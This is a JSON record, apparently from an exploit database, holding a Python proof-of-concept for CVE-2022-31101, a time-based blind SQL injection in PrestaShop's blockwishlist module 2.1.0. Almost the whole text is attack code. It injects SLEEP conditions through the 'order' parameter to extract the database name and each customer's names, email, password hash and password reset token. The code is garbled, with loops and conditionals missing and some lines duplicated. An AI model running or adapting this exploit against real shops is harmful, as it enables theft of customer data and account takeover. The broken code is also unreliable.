{
    "text": "vul_name : Prestashop Blockwishlist 2.1.0 SQL Injection ， vul_cve : CVE-2022-31101 ， vul_poc :  # Exploit Title : Prestashop blockwishlist module 2.1.0 - SQLi ，  # Date : 29/07/22 ，  # Exploit Author : Karthik UJ (  @ 5up3r541y4n )  ，  # Vendor Homepage :  ，  # Software Link ( blockwishlist )  :  ，  # Software Link ( prestashop )  :  ，  # Version ( blockwishlist )  : 2.1.0 ，  # Version ( prestashop )  : 1.7.8.1 ，  # Tested on : Linux ，  # CVE : CVE-2022-31101 ，  # This exploit assumes that the website uses 'ps_' as prefix for the table names since it is the default prefix given by PrestaShop ， url = input ( \"Enter the url of wishlist's endpoint ( \" )  # Example :  ， cookie = input ( \"Enter cookie value : \\n\" )  ， header = { ， \"Cookie\" : cookie ， } ，  # Define static stuff ， param = \"&order=\" ， staticStart = \"p.name ,  ( select case when ( \" ， staticEnd = \" ) then ( SELECT SLEEP ( 7 ) else 1 end )  ; - .asc\" ， charset = 'abcdefghijklmnopqrstuvwxyz1234567890_- @  !  #  $ %&\\' * +/=?^`{ | } ~ ' ， charset = list ( charset )  ， emailCharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_- @  !  #  $ %&\\' * +/=?^`{ | } ~ .' ， emailCharset = list ( emailCharset )  ，  # Query current database name length ， print ( \"\\nFinding db name's length : \" )  ， condition = \"LENGTH ( database (  ) =\" + str ( length )  ， fullUrl = url + param + staticStart + condition + staticEnd ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， dbLength=length ， print ( \"Length : \" , length , end=' )  ， print ( \"\\n\" )  ， print ( \"Enumerating current database name : \" )  ， databaseName = ' ， condition = \" ( SUBSTRING ( database (  )  , \" + str ( i ) + \" , 1 ) ='\" + char + \"' ) \" ， fullUrl = url + param + staticStart + condition + staticEnd ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， print ( char , end=' )  ， databaseName += char ， print (  )  ，  # Enumerate any table ， prefix = \"ps_\" ， tableName = prefix + \"customer\" ， staticStart = \"p.name ,  ( select case when ( \" ， staticEnd1 = \" ) then ( SELECT SLEEP ( 7 ) else 1 end from \" + tableName + \" where id_customer=\" ， staticEnd2 = \" )  ; - .asc\" ， print ( \"\\nEnumerating \" + tableName + \" table\" )  ， condition = \"id_customer=\" + str ( id )  ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， print ( \"\\nOnly \" + str ( id - 1 ) + \" records found. Exiting.\" )  ， pass ， print ( \"\\nid = \" + str ( id )  ，  # Finding firstname length ， condition = \"LENGTH ( firstname ) =\" + str ( length )  ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， firstnameLength=length ， print ( \"Firstname length : \" , length , end=' )  ， print (  )  ，  # Enumerate firstname ， firstname = ' ， print ( \"Firstname : \" , end=' )  ， condition = \"SUBSTRING ( firstname , \" + str ( i ) + \" , 1 ) ='\" + char + \"'\" ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， print ( char , end=' )  ， firstname += char ， print (  )  ，  # Finding lastname length ， condition = \"LENGTH ( lastname ) =\" + str ( length )  ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， lastnameLength=length ， print ( \"Lastname length : \" , length , end=' )  ， print (  )  ，  # Enumerate lastname ， lastname = ' ， print ( \"Lastname : \" , end=' )  ， condition = \"SUBSTRING ( lastname , \" + str ( i ) + \" , 1 ) ='\" + char + \"'\" ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， print ( char , end=' )  ， firstname += char ， print (  )  ，  # Finding email length ， condition = \"LENGTH ( email ) =\" + str ( length )  ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， emailLength=length ， print ( \"Email length : \" , length , end=' )  ， print (  )  ，  # Enumerate email ， email = ' ， print ( \"Email : \" , end=' )  ， condition = \"SUBSTRING ( email , \" + str ( i ) + \" , 1 ) = BINARY '\" + char + \"'\" ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， print ( char , end=' )  ， email += char ， print ( char , end=' )  ， email += char ， print (  )  ，  # Finding password hash length ， condition = \"LENGTH ( passwd ) =\" + str ( length )  ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， passwordHashLength=length ， print ( \"Password hash length : \" , length , end=' )  ， print (  )  ，  # Enumerate password hash ， passwordHash = ' ， print ( \"Password hash : \" , end=' )  ， condition = \"SUBSTRING ( passwd , \" + str ( i ) + \" , 1 ) = BINARY '\" + char + \"'\" ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， print ( char , end=' )  ， passwordHash += char ， print ( char , end=' )  ， passwordHash += char ， print (  )  ，  # Finding password reset token length ， condition = \"LENGTH ( reset_password_token ) =\" + str ( length )  ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， passwordResetTokenLength=length ， print ( \"Password reset token length : \" , length , end=' )  ， print (  )  ，  # Enumerate password reset token ， passwordResetToken = ' ， print ( \"Password reset token : \" , end=' )  ， condition = \"SUBSTRING ( reset_password_token , \" + str ( i ) + \" , 1 ) = BINARY '\" + char + \"'\" ， fullUrl = url + param + staticStart + condition + staticEnd1 + str ( id ) + staticEnd2 ， req = requests.get ( fullUrl , headers=header , timeout=8 )  ， print ( char , end=' )  ， passwordResetToken += char ， print ( char , end=' )  ， passwordResetToken += char ， print (  ) ",
    "time": "2022.08.14"
}